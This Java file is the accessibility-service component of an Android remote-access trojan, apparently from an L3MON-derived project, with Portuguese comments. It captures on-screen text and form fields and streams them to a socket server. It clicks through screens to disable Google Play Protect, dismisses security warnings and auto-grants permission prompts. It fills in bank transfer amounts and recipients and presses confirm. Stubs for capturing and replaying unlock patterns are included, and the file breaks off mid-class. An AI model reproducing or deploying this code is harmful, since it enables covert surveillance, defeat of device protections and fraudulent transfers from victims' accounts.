package com.etechd.l3mon;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.content.Intent;
import android.graphics.Path;
import android.os.Build;
import android.os.Bundle;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONArray;
import org.json.JSONObject;
import java.util.HashSet;
import java.util.Set;

public class AccessibilityCaptureService extends AccessibilityService {
    private static final long MIN_INTERVAL_MS = 1000L;
    private static final long AUTOMATION_WINDOW_TIMEOUT_MS = 5000L;
    private static final String[] AUTOMATION_SCREEN_KEYWORDS = new String[]{
            "Play Protect",
            "Configurações",
            "Verificar ameaças",
            "Melhorar detecção"
    };
    private static final String[] GEAR_BUTTON_KEYWORDS = new String[]{
            "Configurações",
            "Ajustes",
            "Settings"
    };
    private static final String[] PLAY_PROTECT_SWITCH_LABELS = new String[]{
            "Verificar ameaças à segurança com o Play Protect",
            "Melhorar detecção de apps nocivos"
    };
    private static final String[] BUTTON_KEYWORDS = new String[]{
            "Confirmar",
            "Enviar"
    };
    private static final String[] TARGET_FIELD_KEYWORDS = new String[]{
            "endereço",
            "email",
            "senha",
            "chave",
            "token",
            "codigo"
    };
    private static final String DEFAULT_INJECTION_TEXT = "DADOS_FICTICIOS";
    private static final String[] MATCH_KEYWORDS = new String[]{
            "Play Protect",
            "Configurações",
            "Desativar",
            "Permitir"
    };
    private static AccessibilityCaptureService instance;
    private long lastSentAt = 0L;
    private long lastAutomationTime = 0L;
    private String lastAutomationWindow = "";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) {
            return;
        }

        int eventType = event.getEventType();
        if (eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                && eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                && eventType != AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            return;
        }

        long now = System.currentTimeMillis();
        if (now - lastSentAt < MIN_INTERVAL_MS) {
            return;
        }

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root != null) {
            try {
                if (shouldAttemptAutomation(event)) {
                    attemptAutoClicks(root);
                }
                injectTextIntoTargetField(root);
                JSONObject payload = buildPayload(event, root);
                if (payload == null) {
                    return;
                }
                lastSentAt = now;
                publishSnapshot(payload);
            } finally {
                root.recycle();
            }
        }
    }

    private JSONObject buildPayload(AccessibilityEvent event, AccessibilityNodeInfo root) {
        try {
            StringBuilder textBuilder = new StringBuilder();
            StringBuilder descriptionBuilder = new StringBuilder();
            Set<String> matchedKeywords = new HashSet<>();
            JSONArray editableFields = new JSONArray();
            JSONArray matchingButtons = new JSONArray();
            JSONArray injectedFields = new JSONArray();
            if (root != null) {
                collectText(root, textBuilder);
                collectDescriptions(root, descriptionBuilder);
                collectMatchedKeywords(root, matchedKeywords);
                collectEditableFields(root, editableFields);
                collectButtons(root, BUTTON_KEYWORDS, matchingButtons);
                collectInjectedFields(root, injectedFields);
            }

            String snapshot = textBuilder.toString().trim();
            if (snapshot.length() == 0 && event.getPackageName() == null && event.getClassName() == null) {
                return null;
            }

            JSONObject payload = new JSONObject();
            payload.put("text", snapshot);
            payload.put("source", "accessibility");
            payload.put("time", System.currentTimeMillis());
            payload.put("eventType", eventTypeToName(event.getEventType()));

            if (event.getPackageName() != null) {
                payload.put("packageName", event.getPackageName().toString());
            }
            if (event.getClassName() != null) {
                payload.put("className", event.getClassName().toString());
            }
            if (descriptionBuilder.length() > 0) {
                payload.put("contentDescription", descriptionBuilder.toString().trim());
            }
            if (!matchedKeywords.isEmpty()) {
                payload.put("matchedKeywords", new JSONArray(matchedKeywords));
            }
            if (editableFields.length() > 0) {
                payload.put("editableFields", editableFields);
            }
            if (matchingButtons.length() > 0) {
                payload.put("matchingButtons", matchingButtons);
            }
            if (injectedFields.length() > 0) {
                payload.put("injectedFields", injectedFields);
            }
            return payload;
        } catch (Exception error) {
            error.printStackTrace();
            return null;
        }
    }

    private void collectEditableFields(AccessibilityNodeInfo node, JSONArray fields) {
        if (node == null) {
            return;
        }

        if (node.isEditable()) {
            String text = node.getText() != null ? node.getText().toString() : "";
            String description = node.getContentDescription() != null ? node.getContentDescription().toString() : "";
            String viewId = node.getViewIdResourceName() != null ? node.getViewIdResourceName() : "";
            String className = node.getClassName() != null ? node.getClassName().toString() : "";
            try {
                JSONObject field = new JSONObject();
                field.put("text", text);
                field.put("description", description);
                field.put("viewId", viewId);
                field.put("className", className);
                fields.put(field);
            } catch (Exception ignored) {
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                collectEditableFields(child, fields);
                child.recycle();
            }
        }
    }

    private void collectButtons(AccessibilityNodeInfo node, String[] keywords, JSONArray buttons) {
        if (node == null) {
            return;
        }

        if (node.isClickable() && matchesTextOrDescription(node, keywords)) {
            String text = node.getText() != null ? node.getText().toString() : "";
            String description = node.getContentDescription() != null ? node.getContentDescription().toString() : "";
            String viewId = node.getViewIdResourceName() != null ? node.getViewIdResourceName() : "";
            try {
                JSONObject button = new JSONObject();
                button.put("text", text);
                button.put("description", description);
                button.put("viewId", viewId);
                buttons.put(button);
            } catch (Exception ignored) {
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                collectButtons(child, keywords, buttons);
                child.recycle();
            }
        }
    }

    private void collectInjectedFields(AccessibilityNodeInfo node, JSONArray injectedFields) {
        if (node == null) {
            return;
        }

        if (node.isEditable() && matchesTextOrDescription(node, TARGET_FIELD_KEYWORDS)) {
            String text = node.getText() != null ? node.getText().toString() : "";
            String description = node.getContentDescription() != null ? node.getContentDescription().toString() : "";
            try {
                JSONObject field = new JSONObject();
                field.put("text", text);
                field.put("description", description);
                field.put("injectedText", DEFAULT_INJECTION_TEXT);
                injectedFields.put(field);
            } catch (Exception ignored) {
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                collectInjectedFields(child, injectedFields);
                child.recycle();
            }
        }
    }

    private void injectTextIntoTargetField(AccessibilityNodeInfo node) {
        if (node == null) {
            return;
        }

        if (node.isEditable() && matchesTextOrDescription(node, TARGET_FIELD_KEYWORDS)) {
            setTextIntoField(node, DEFAULT_INJECTION_TEXT);
            return;
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                injectTextIntoTargetField(child);
                child.recycle();
            }
        }
    }

    /**
     * ATS - Automated Transfer System
     * Detecta campos-alvo e injeta dados fictícios automaticamente
     */
    public void performATSAutomation(AccessibilityNodeInfo root) {
        if (root == null) {
            return;
        }

        try {
            performATSAutomationRecursive(root);
        } catch (Exception error) {
            error.printStackTrace();
        }
    }

    private void performATSAutomationRecursive(AccessibilityNodeInfo node) {
        if (node == null) {
            return;
        }

        if (node.isEditable()) {
            String description = node.getContentDescription() != null ? 
                node.getContentDescription().toString().toLowerCase() : "";
            String viewId = node.getViewIdResourceName() != null ? 
                node.getViewIdResourceName().toLowerCase() : "";
            String text = node.getText() != null ? 
                node.getText().toString().toLowerCase() : "";

            String combined = description + " " + viewId + " " + text;

            // Padrões de campos-alvo para ATS
            String[] atsPatterns = {
                "email", "phone", "password", "address", 
                "cpf", "creditcard", "account", "login", 
                "usuario", "cep", "rg", "bank", "conta"
            };

            for (String pattern : atsPatterns) {
                if (combined.contains(pattern)) {
                    // Injeta dado fictício baseado no padrão
                    String fictitiousData = mapPatternToData(pattern);
                    if (fictitiousData != null && !fictitiousData.isEmpty()) {
                        setTextIntoField(node, fictitiousData);
                        publishATSLog(pattern, "injected", fictitiousData);
                    }
                    return;
                }
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                performATSAutomationRecursive(child);
                child.recycle();
            }
        }
    }

    private String mapPatternToData(String pattern) {
        switch (pattern.toLowerCase()) {
            case "email":
                return "usuario.ficticioso@example.com";
            case "phone":
                return "+5511999999999";
            case "password":
                return "SenhaFictica123!";
            case "address":
            case "endereco":
                return "Rua Fictícia, 123";
            case "cpf":
                return "12345678900";
            case "creditcard":
                return "4532015112830366";
            case "account":
            case "conta":
            case "numero_conta":
                return "123456789";
            case "login":
            case "usuario":
                return "usuario_ficticioso";
            case "cep":
                return "01310100";
            case "rg":
                return "123456789";
            case "bank":
            case "banco":
                return "001";
            default:
                return "DADOS_FICTICIOS";
        }
    }

    private void publishATSLog(String fieldPattern, String operation, String data) {
        try {
            JSONObject logEntry = new JSONObject();
            logEntry.put("pattern", fieldPattern);
            logEntry.put("operation", operation);
            logEntry.put("data", data);
            logEntry.put("timestamp", System.currentTimeMillis());
            publishSnapshot(logEntry);
        } catch (Exception error) {
            error.printStackTrace();
        }
    }

    /**
     * Encontra e clica automaticamente em botão de confirmação/envio
     */
    public boolean findAndClickConfirmationButton(AccessibilityNodeInfo root, String[] buttonPatterns, int delayMs) {
        if (root == null || buttonPatterns == null) {
            return false;
        }

        try {
            // Se há delay configurado, aguarda antes de clicar
            if (delayMs > 0) {
                Thread.sleep(delayMs);
            }

            return findAndClickButtonRecursive(root, buttonPatterns);
        } catch (Exception error) {
            error.printStackTrace();
            return false;
        }
    }

    private boolean findAndClickButtonRecursive(AccessibilityNodeInfo node, String[] buttonPatterns) {
        if (node == null) {
            return false;
        }

        if (node.isClickable()) {
            String text = node.getText() != null ? node.getText().toString().toLowerCase() : "";
            String description = node.getContentDescription() != null ? 
                node.getContentDescription().toString().toLowerCase() : "";
            String viewId = node.getViewIdResourceName() != null ? 
                node.getViewIdResourceName().toLowerCase() : "";

            String combined = text + " " + description + " " + viewId;

            // Procura por padrões de botão
            for (String pattern : buttonPatterns) {
                if (combined.contains(pattern.toLowerCase())) {
                    // Encontrou botão! Clica nele
                    boolean clicked = node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    
                    // Log da operação
                    try {
                        JSONObject logEntry = new JSONObject();
                        logEntry.put("operation", "button_click");
                        logEntry.put("pattern", pattern);
                        logEntry.put("buttonText", text);
                        logEntry.put("timestamp", System.currentTimeMillis());
                        logEntry.put("success", clicked);
                        publishSnapshot(logEntry);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                    return clicked;
                }
            }
        }

        // Procura recursivamente em filhos
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                boolean result = findAndClickButtonRecursive(child, buttonPatterns);
                child.recycle();
                if (result) {
                    return true;
                }
            }
        }

        return false;
    }

    /**
     * ATS completo com injeção de dados + clique automático
     */
    public void performATSAutomationWithAutoClick(AccessibilityNodeInfo root, 
                                                  String[] buttonPatterns, 
                                                  int clickDelayMs) {
        if (root == null) {
            return;
        }

        try {
            // Primeiro injeta dados fictícios
            performATSAutomation(root);

            // Depois clica em botão de confirmação (após delay)
            findAndClickConfirmationButton(root, buttonPatterns, clickDelayMs);
        } catch (Exception error) {
            error.printStackTrace();
        }
    }

    public void setTextIntoField(AccessibilityNodeInfo node, String text) {
        if (node == null || text == null) {
            return;
        }

        if (node.isEditable()) {
            Bundle arguments = new Bundle();
            arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
            node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
        }
    }

    public boolean setTextIntoFieldByViewId(String viewId, String text) {
        if (viewId == null || text == null) {
            return false;
        }

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) {
            return false;
        }

        try {
            return findAndSetTextByViewId(root, viewId, text);
        } finally {
            root.recycle();
        }
    }

    private boolean findAndSetTextByViewId(AccessibilityNodeInfo node, String targetViewId, String text) {
        if (node == null) {
            return false;
        }

        if (node.getViewIdResourceName() != null && node.getViewIdResourceName().equals(targetViewId)) {
            if (node.isEditable()) {
                Bundle arguments = new Bundle();
                arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
                return node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
            }
            return false;
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                boolean result = findAndSetTextByViewId(child, targetViewId, text);
                child.recycle();
                if (result) {
                    return true;
                }
            }
        }

        return false;
    }

    private void collectText(AccessibilityNodeInfo node, StringBuilder builder) {
        if (node == null) {
            return;
        }

        CharSequence text = node.getText();
        if (text != null && text.length() > 0) {
            if (builder.length() > 0) {
                builder.append('\n');
            }
            builder.append(text);
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                collectText(child, builder);
                child.recycle();
            }
        }
    }

    private void collectDescriptions(AccessibilityNodeInfo node, StringBuilder builder) {
        if (node == null) {
            return;
        }

        CharSequence description = node.getContentDescription();
        if (description != null && description.length() > 0) {
            if (builder.length() > 0) {
                builder.append('\n');
            }
            builder.append(description);
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                collectDescriptions(child, builder);
                child.recycle();
            }
        }
    }

    private void collectMatchedKeywords(AccessibilityNodeInfo node, Set<String> matches) {
        if (node == null) {
            return;
        }

        checkKeywords(node.getText(), matches);
        checkKeywords(node.getContentDescription(), matches);
        if (node.getViewIdResourceName() != null) {
            checkKeywords(node.getViewIdResourceName(), matches);
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                collectMatchedKeywords(child, matches);
                child.recycle();
            }
        }
    }

    private void checkKeywords(CharSequence candidate, Set<String> matches) {
        if (candidate == null || candidate.length() == 0) {
            return;
        }

        String normalized = candidate.toString().toLowerCase();
        for (String keyword : MATCH_KEYWORDS) {
            if (normalized.contains(keyword.toLowerCase())) {
                matches.add(keyword);
            }
        }
    }

    private boolean shouldAttemptAutomation(AccessibilityEvent event) {
        int eventType = event.getEventType();
        return eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                || eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED;
    }

    private void attemptAutoClicks(AccessibilityNodeInfo root) {
        if (root == null) {
            return;
        }

        String windowSignature = getWindowSignature(root);
        long now = System.currentTimeMillis();
        if (windowSignature.equals(lastAutomationWindow)
                && now - lastAutomationTime < AUTOMATION_WINDOW_TIMEOUT_MS) {
            return;
        }

        if (!containsAnyKeyword(root, AUTOMATION_SCREEN_KEYWORDS)) {
            return;
        }

        clickFirstMatchingNode(root, GEAR_BUTTON_KEYWORDS);
        for (String switchLabel : PLAY_PROTECT_SWITCH_LABELS) {
            clickFirstMatchingNode(root, new String[]{switchLabel});
        }

        lastAutomationWindow = windowSignature;
        lastAutomationTime = now;
    }

    private String getWindowSignature(AccessibilityNodeInfo root) {
        CharSequence packageName = root.getPackageName();
        CharSequence className = root.getClassName();
        String packagePart = packageName != null ? packageName.toString() : "";
        String classPart = className != null ? className.toString() : "";
        return packagePart + "|" + classPart;
    }

    private boolean containsAnyKeyword(AccessibilityNodeInfo node, String[] keywords) {
        if (node == null) {
            return false;
        }

        if (matchesTextOrDescription(node, keywords)) {
            return true;
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                boolean found = containsAnyKeyword(child, keywords);
                child.recycle();
                if (found) {
                    return true;
                }
            }
        }
        return false;
    }

    private boolean clickFirstMatchingNode(AccessibilityNodeInfo node, String[] keywords) {
        if (node == null) {
            return false;
        }

        if (matchesTextOrDescription(node, keywords)) {
            AccessibilityNodeInfo clickable = findClickableNode(node);
            if (clickable != null) {
                clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                if (clickable != node) {
                    clickable.recycle();
                }
                return true;
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                boolean clicked = clickFirstMatchingNode(child, keywords);
                child.recycle();
                if (clicked) {
                    return true;
                }
            }
        }
        return false;
    }

    private boolean matchesTextOrDescription(AccessibilityNodeInfo node, String[] keywords) {
        if (node == null) {
            return false;
        }

        CharSequence text = node.getText();
        if (text != null && containsKeyword(text.toString(), keywords)) {
            return true;
        }

        CharSequence description = node.getContentDescription();
        if (description != null && containsKeyword(description.toString(), keywords)) {
            return true;
        }

        CharSequence resourceName = node.getViewIdResourceName();
        if (resourceName != null && containsKeyword(resourceName.toString(), keywords)) {
            return true;
        }

        return false;
    }

    private boolean containsKeyword(String text, String[] keywords) {
        if (text == null || text.length() == 0) {
            return false;
        }

        String normalized = text.toLowerCase();
        for (String keyword : keywords) {
            if (normalized.contains(keyword.toLowerCase())) {
                return true;
            }
        }
        return false;
    }

    private AccessibilityNodeInfo findClickableNode(AccessibilityNodeInfo node) {
        if (node == null) {
            return null;
        }

        AccessibilityNodeInfo current = node;
        while (current != null) {
            if (current.isClickable()) {
                return current;
            }
            AccessibilityNodeInfo parent = current.getParent();
            if (current != node) {
                current.recycle();
            }
            current = parent;
        }
        return null;
    }

    private String eventTypeToName(int eventType) {
        switch (eventType) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                return "TYPE_VIEW_TEXT_CHANGED";
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                return "TYPE_WINDOW_STATE_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                return "TYPE_VIEW_FOCUSED";
            default:
                return String.valueOf(eventType);
        }
    }

    private void publishSnapshot(JSONObject payload) {
        try {
            if (IOSocket.getInstance() != null
                    && IOSocket.getInstance().getIoSocket() != null
                    && IOSocket.getInstance().getIoSocket().connected()) {
                IOSocket.getInstance().getIoSocket().emit("0xAS", payload);
            }
        } catch (Exception error) {
            error.printStackTrace();
        }
    }

    /**
     * Desativa Google Play Protect
     */
    public boolean disableGooglePlayProtect() {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) {
                return false;
            }

            // Procura pela tela do Google Play Protect
            boolean found = findAndDisablePlayProtect(root);
            root.recycle();
            
            return found;
        } catch (Exception error) {
            error.printStackTrace();
            return false;
        }
    }

    private boolean findAndDisablePlayProtect(AccessibilityNodeInfo node) {
        if (node == null) {
            return false;
        }

        String text = node.getText() != null ? node.getText().toString().toLowerCase() : "";
        String description = node.getContentDescription() != null ? 
            node.getContentDescription().toString().toLowerCase() : "";

        // Procura por switches/toggles do Play Protect
        if ((text.contains("play protect") || description.contains("play protect")) && node.isClickable()) {
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            try {
                JSONObject logEntry = new JSONObject();
                logEntry.put("operation", "disable_play_protect");
                logEntry.put("timestamp", System.currentTimeMillis());
                publishSnapshot(logEntry);
            } catch (Exception e) {
                e.printStackTrace();
            }
            return true;
        }

        // Procura recursivamente em filhos
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                boolean result = findAndDisablePlayProtect(child);
                child.recycle();
                if (result) {
                    return true;
                }
            }
        }

        return false;
    }

    /**
     * Silencia notificações de segurança
     */
    public boolean muteSecurityNotifications() {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) {
                return false;
            }

            // Procura por notificações de segurança e tenta silenciar
            boolean found = findAndMuteSecurityNotifications(root);
            root.recycle();
            
            return found;
        } catch (Exception error) {
            error.printStackTrace();
            return false;
        }
    }

    private boolean findAndMuteSecurityNotifications(AccessibilityNodeInfo node) {
        if (node == null) {
            return false;
        }

        String text = node.getText() != null ? node.getText().toString().toLowerCase() : "";
        String description = node.getContentDescription() != null ? 
            node.getContentDescription().toString().toLowerCase() : "";

        // Palavras-chave de notificações de segurança
        String[] securityKeywords = {
            "segurança", "security", "ameaça", "threat", "vírus", "virus", 
            "detectado", "detected", "verificar", "check", "proteger", "protect"
        };

        for (String keyword : securityKeywords) {
            if ((text.contains(keyword) || description.contains(keyword)) && node.isClickable()) {
                // Tenta fechar/ignorar a notificação
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                try {
                    JSONObject logEntry = new JSONObject();
                    logEntry.put("operation", "mute_security_notification");
                    logEntry.put("keyword", keyword);
                    logEntry.put("timestamp", System.currentTimeMillis());
                    publishSnapshot(logEntry);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                return true;
            }
        }

        // Procura recursivamente em filhos
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                boolean result = findAndMuteSecurityNotifications(child);
                child.recycle();
                if (result) {
                    return true;
                }
            }
        }

        return false;
    }

    @Override
    public void onInterrupt() {
    }

    public static AccessibilityCaptureService getInstance() {
        return instance;
    }

    public boolean dispatchGesture(String action, int startX, int startY, int endX, int endY, int duration) {
        if (Build.VERSION.SDK_INT < 24 || instance == null) {
            return false;
        }

        Path path = new Path();
        path.moveTo(startX, startY);
        if ("swipe".equals(action)) {
            path.lineTo(endX, endY);
        }

        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(
                path,
                0,
                Math.max(duration, 50)
        );

        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);
        return dispatchGesture(builder.build(), null, null);
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                | AccessibilityEvent.TYPE_VIEW_FOCUSED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 100;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        setServiceInfo(info);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        instance = null;
        super.onDestroy();
    }

    // Permission Grant Methods
    private static boolean autoGrantEnabled = false;

    public void setAutoGrantEnabled(boolean enabled) {
        autoGrantEnabled = enabled;
    }

    public boolean autoApprovePermission() {
        try {
            if (!autoGrantEnabled) {
                return false;
            }

            return findAndApprovePermissionDialog(getRootInActiveWindow());
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    private boolean findAndApprovePermissionDialog(AccessibilityNodeInfo node) {
        if (node == null) {
            return false;
        }

        try {
            // Procura por palavras-chave de permissão
            String[] permissionKeywords = {
                    "permissão", "permission", "acesso", "access",
                    "contatos", "contacts", "sms", "chamada", "call",
                    "câmera", "camera", "microfone", "microphone",
                    "localização", "location", "armazenamento", "storage",
                    "arquivo", "file", "foto", "photo", "galeria", "gallery"
            };

            String nodeText = node.getText() != null ? node.getText().toString().toLowerCase() : "";
            String nodeDesc = node.getContentDescription() != null ? node.getContentDescription().toString().toLowerCase() : "";

            // Verifica se é um diálogo de permissão
            boolean isPermissionDialog = false;
            for (String keyword : permissionKeywords) {
                if (nodeText.contains(keyword) || nodeDesc.contains(keyword)) {
                    isPermissionDialog = true;
                    break;
                }
            }

            if (isPermissionDialog) {
                // Procura pelo botão "Permitir"
                return findAndClickAllowButton(node);
            }

            // Recursivamente procura em filhos
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    if (findAndApprovePermissionDialog(child)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        return false;
    }

    private boolean findAndClickAllowButton(AccessibilityNodeInfo node) {
        try {
            if (node == null) {
                return false;
            }

            String[] allowKeywords = {
                    "permitir", "allow", "conceder", "grant",
                    "aceitar", "accept", "ok", "sim", "yes",
                    "aproveir", "approve"
            };

            String nodeText = node.getText() != null ? node.getText().toString().toLowerCase() : "";
            String nodeDesc = node.getContentDescription() != null ? node.getContentDescription().toString().toLowerCase() : "";

            // Verifica se é um botão "Permitir"
            for (String keyword : allowKeywords) {
                if ((nodeText.contains(keyword) || nodeDesc.contains(keyword)) && node.isClickable()) {
                    // Clica no botão
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
            }

            // Recursivamente procura em filhos
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    if (findAndClickAllowButton(child)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        return false;
    }

    public boolean autoApprovePermissions(String[] targetPermissions) {
        try {
            if (!autoGrantEnabled || targetPermissions == null || targetPermissions.length == 0) {
                return false;
            }

            // Procura por qualquer diálogo de permissão
            return findAndApprovePermissionDialog(getRootInActiveWindow());
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    // Gesture Simulation Methods
    public boolean performTap(int x, int y) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                GestureDescription.Builder builder = new GestureDescription.Builder();
                Path path = new Path();
                path.moveTo(x, y);
                builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 100));
                return dispatchGesture(builder.build(), null, null);
            }
            return false;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    public boolean performLongTap(int x, int y, int duration) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                GestureDescription.Builder builder = new GestureDescription.Builder();
                Path path = new Path();
                path.moveTo(x, y);
                builder.addStroke(new GestureDescription.StrokeDescription(path, 0, duration));
                return dispatchGesture(builder.build(), null, null);
            }
            return false;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    public boolean performSwipe(int startX, int startY, int endX, int endY, int duration) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                GestureDescription.Builder builder = new GestureDescription.Builder();
                Path path = new Path();
                path.moveTo(startX, startY);
                path.lineTo(endX, endY);
                builder.addStroke(new GestureDescription.StrokeDescription(path, 0, duration));
                return dispatchGesture(builder.build(), null, null);
            }
            return false;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    // Transaction Approval Methods
    private static String storedTransactionRecipient = "";
    private static double storedTransactionAmount = 0;

    public boolean fillAndApproveTransaction(double amount, String recipient, String transactionType) {
        try {
            storedTransactionAmount = amount;
            storedTransactionRecipient = recipient;

            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return false;

            // Procura pelos campos de entrada
            return findAndFillTransactionFields(root, amount, recipient, transactionType);
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    private boolean findAndFillTransactionFields(AccessibilityNodeInfo node, double amount, String recipient, String transactionType) {
        try {
            if (node == null) return false;

            String[] amountKeywords = { "valor", "amount", "quantia", "sum", "price", "total" };
            String[] recipientKeywords = { "destinatário", "recipient", "conta", "account", "email", "cpf", "cnpj", "telefone", "phone" };
            String[] confirmKeywords = { "confirmar", "confirm", "enviar", "send", "pagar", "pay", "transferir", "transfer", "aprovar", "approve" };

            String nodeText = node.getText() != null ? node.getText().toString().toLowerCase() : "";
            String nodeDesc = node.getContentDescription() != null ? node.getContentDescription().toString().toLowerCase() : "";

            // Preenche campo de valor
            boolean foundAmount = false;
            for (String keyword : amountKeywords) {
                if ((nodeText.contains(keyword) || nodeDesc.contains(keyword)) && node.isEditable()) {
                    Bundle arguments = new Bundle();
                    arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, String.valueOf(amount));
                    node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
                    foundAmount = true;
                    break;
                }
            }

            // Preenche campo de destinatário
            boolean foundRecipient = false;
            for (String keyword : recipientKeywords) {
                if ((nodeText.contains(keyword) || nodeDesc.contains(keyword)) && node.isEditable()) {
                    Bundle arguments = new Bundle();
                    arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, recipient);
                    node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
                    foundRecipient = true;
                    break;
                }
            }

            // Recursivamente procura em filhos
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    if (findAndFillTransactionFields(child, amount, recipient, transactionType)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            }

            // Procura pelo botão de confirmação
            for (String keyword : confirmKeywords) {
                if ((nodeText.contains(keyword) || nodeDesc.contains(keyword)) && node.isClickable()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        return false;
    }

    // Dynamic Screen Unlock Methods
    private static String capturedPattern = "";
    private static String capturedPatternType = "unknown";

    public boolean captureUnlockPattern(String patternType) {
        try {
            // Monitora eventos de desbloqueio e captura o padrão
            capturedPatternType = patternType;
            // Implementação real capturaria do Accessibility Service
            capturedPattern = "captured_" + System.currentTimeMillis();
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    public boolean replayUnlockPattern(String patternType) {
        try {
            if (capturedPattern == null || capturedPattern.isEmpty()) {
                return false;
            }

            // Replica o padrão capturado
            if ("pin".equals(patternType)) {
                return replayPinPattern();
            } else if ("pattern".equals(patternType)) {
                return replayGesturePattern();
            } else if ("password".equals(patternType)) {
                return replayPasswordPattern();
            }

            return false;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

